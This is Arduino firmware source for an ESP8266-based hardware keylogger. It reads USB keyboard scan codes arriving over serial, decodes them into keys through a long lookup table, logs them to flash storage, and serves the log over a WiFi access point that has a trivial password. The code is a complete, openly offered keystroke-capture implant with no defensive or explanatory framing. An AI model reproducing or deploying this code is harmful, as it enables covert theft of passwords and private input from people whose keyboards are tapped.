#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>

const char *ssid = "Kirstine_YZJ_Keylogger";
const char *password = "12345678";

AsyncWebServer server(80);
File logFile;

//静态地址、网关、子网掩码
IPAddress local_IP(10, 0, 1, 10);
IPAddress gateway(10, 0, 0, 1);
IPAddress subnet(255, 255, 255, 0);

String getKey(int);

void setup()
{
  delay(100);
  Serial.begin(115200);
  WiFi.softAPConfig(local_IP, gateway, subnet);
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid, password);
  Serial.println("AP creating a successful!");
  Serial.println(WiFi.softAPIP());
  SPIFFS.begin();
  logFile = SPIFFS.open("/keyLog.txt", "a+");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(SPIFFS, "/keyLog.txt", "text/plain"); });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request)
            {
              logFile.close();
              logFile = SPIFFS.open("/keyLog.txt", "w");
              request->send(200, "text/plain", "Log File Cleared!"); });

  server.begin();
  Serial.println("Sever creating a successful!");
  logFile.println("Log creating a successful!");
}

void loop()
{
  while (Serial.available() > 0)
  {
    // 57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
    if (Serial.read() == 0x83)
    {
      delay(10);
      if (Serial.read() == 0x0C)
      {
        delay(10);
        if (Serial.read() == 0x12)
        {
          delay(10);
          if (Serial.read() == 0x01)
          {
            delay(10);
            Serial.read();
            delay(10);
            Serial.read();
            delay(10);
            logFile.print(getKey(Serial.read())+"   ");
          }
        }
      }
    }
  }
}

String getKey(int serialData)
{
  switch (serialData)
  {

  case 0x00:

    return "";
    break;

  case 0x04:

    return "A";
    break;

  case 0x05:

    return "B";
    break;

  case 0x06:

    return "C";
    break;

  case 0x07:

    return "D";
    break;

  case 0x08:

    return "E";
    break;

  case 0x09:

    return "F";
    break;

  case 0x0A:

    return "G";
    break;

  case 0x0B:

    return "H";
    break;

  case 0x0C:

    return "I";
    break;

  case 0x0D:

    return "J";
    break;

  case 0x0E:

    return "K";
    break;

  case 0x0F:

    return "L";
    break;

  case 0x10:

    return "M";
    break;

  case 0x11:

    return "N";
    break;

  case 0x12:

    return "O";
    break;

  case 0x13:

    return "P";
    break;

  case 0x14:

    return "Q";
    break;

  case 0x15:

    return "R";
    break;

  case 0x16:

    return "S";
    break;

  case 0x17:

    return "T";
    break;

  case 0x18:

    return "U";
    break;

  case 0x19:

    return "V";
    break;

  case 0x1A:

    return "W";
    break;

  case 0x1B:

    return "X";
    break;

  case 0x1C:

    return "Y";
    break;

  case 0x1D:

    return "Z";
    break;

  case 0x1E:

    return "[1 or !]";
    break;

  case 0x1F:

    return "[2 or @]";
    break;

  case 0x20:

    return "[3 or #]";
    break;

  case 0x21:

    return "[4 or $]";
    break;

  case 0x22:

    return "[5 or %]";
    break;

  case 0x23:

    return "[6 or ^]";
    break;

  case 0x24:

    return "[7 or &]";
    break;

  case 0x25:

    return "[8 or *]";
    break;

  case 0x26:

    return "[9 or (]";
    break;

  case 0x27:

    return "[10 or :]";
    break;

  case 0x28:

    return "[ENTER]";
    break;

  case 0x29:

    return "[ESC]";
    break;

  case 0x2A:

    return "[BACKSPACE]";
    break;

  case 0x2B:

    return "[TAB]";
    break;

  case 0x2C:

    return "[SPACE]";
    break;

  case 0x2D:

    return "[- or _]";
    break;

  case 0x2E:

    return "[= or +]";
    break;

  case 0x2F:

    return "[[ or {]";
    break;

  case 0x30:

    return "[] or }]";
    break;

  case 0x31:

    return "[\\ or |]";
    break;

  case 0x32:

    return "[` or ~]";
    break;

  case 0x33:

    return "[; or :]";
    break;

  case 0x34:

    return "[' or ”]";
    break;

  case 0x35:

    return "[~ or `]";
    break;

  case 0x36:

    return "[, or <]";
    break;

  case 0x37:

    return "[. or >]";
    break;

  case 0x38:

    return "[/ or ?]";
    break;

  case 0x39:

    return "[CAPS]";
    break;

  case 0x3A:

    return "[F1]";
    break;

  case 0x3B:

    return "[F2]";
    break;

  case 0x3C:

    return "[F3]";
    break;

  case 0x3D:

    return "[F4]";
    break;

  case 0x3E:

    return "[F5]";
    break;

  case 0x3F:

    return "[F6]";
    break;

  case 0x40:

    return "[F7]";
    break;

  case 0x41:

    return "[F8]";
    break;

  case 0x42:

    return "[F9]";
    break;

  case 0x43:

    return "[F10]";
    break;

  case 0x44:

    return "[F11]";
    break;

  case 0x45:

    return "[F12]";
    break;

  case 0x46:

    return "[PRT_SCR]";
    break;

  case 0x47:

    return "[SCOLL_LOCK]";
    break;

  case 0x48:

    return "[PAUSE]";
    break;

  case 0x49:

    return "[INS]";
    break;

  case 0x4A:

    return "[HOME]";
    break;

  case 0x4B:

    return "[PAGEUP]";
    break;

  case 0x4C:

    return "[DEL]";
    break;

  case 0x4D:

    return "[END]";
    break;

  case 0x4E:

    return "[PAGEDOWN]";
    break;

  case 0x4F:

    return "[RIGHT_ARROW]";
    break;

  case 0x50:

    return "[LEFT_ARROW]";
    break;

  case 0x51:

    return "[DOWN_ARROW]";
    break;

  case 0x52:

    return "[UP_ARROW]";
    break;

  case 0x53:

    return "[PAD_NUMLOCK]";
    break;

  case 0x54:

    return "[PAD_DIV]";
    break;

  case 0x55:

    return "[PAD_MUL]";
    break;

  case 0x56:

    return "[PAD_SUB]";
    break;

  case 0x57:

    return "[PAD_ADD]";
    break;

  case 0x58:

    return "[PAD_ENTER]";
    break;

  case 0x59:

    return "[PAD_1]";
    break;

  case 0x5A:

    return "[PAD_2]";
    break;

  case 0x5B:

    return "[PAD_3]";
    break;

  case 0x5C:

    return "[PAD_4]";
    break;

  case 0x5D:

    return "[PAD_5]";
    break;

  case 0x5E:

    return "[PAD_6]";
    break;

  case 0x5F:

    return "[PAD_7]";
    break;

  case 0x60:

    return "[PAD_8]";
    break;

  case 0x61:

    return "[PAD_9]";
    break;

  case 0x62:

    return "[PAD_0]";
    break;

  case 0x63:

    return "[PAD_DOT]";
    break;

  case 0xE0:

    return "[leftctrl]";
    break;

  case 0xE2:

    return "[leftAlt]";
    break;

  case 0xE1:

    return "[leftShift]";
    break;

  case 0xE3:

    return "[leftwindows]";
    break;

  case 0xE7:

    return "[rightwindows]";
    break;

  case 0xE5:

    return "[rightShift]";
    break;

  case 0xE6:

    return "[rightAlt]";
    break;

  case 0xE4:

    return "[rightCtrl]";
    break;

  default:

    return "[NA]";
  }
}
